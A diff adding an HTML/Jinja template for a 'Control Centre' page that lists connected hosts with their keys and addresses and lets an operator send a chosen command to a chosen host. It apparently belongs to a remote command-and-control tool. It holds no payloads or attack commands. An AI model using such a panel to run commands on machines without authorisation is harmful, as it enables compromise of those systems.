@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Control Centre</title>
+</head>
+
+<body>
+    <h1>Control Centre</h1>
+    <h2> {{ clients | count }} hosts connected</h2>
+    <form action="" method="POST">
+        <label for="command" id="command_label">Select a command to run</label>
+        <select id="command" name="command">
+            <option value="" selected disabled hidden>Select a command</option>
+            {% for command in commands %}
+            <option value="{{ command.label_value }}">{{ command.label }}</option>
+            {% endfor %}
+        </select>
+        <br>
+
+        <label for="target" id="target_label">Target</label>
+        <select id="target" name="target">
+            <option value="none" selected disabled hidden>Select a target</option>
+            {% for id, client in clients %}
+            <option value="{{ id }}"> {{ id }} </option>
+            {% endfor %}
+        </select>
+        <br>
+
+        <input type="submit" value="Run">
+    </form>
+    {% for id, client in clients %}
+    <h2>{{ id }}</h2>
+    <h3>{{ client.key }} </h3>
+    <h3>{{ client.addr }}</h3>
+    {% endfor %}
+
+</body>
+
+</html>
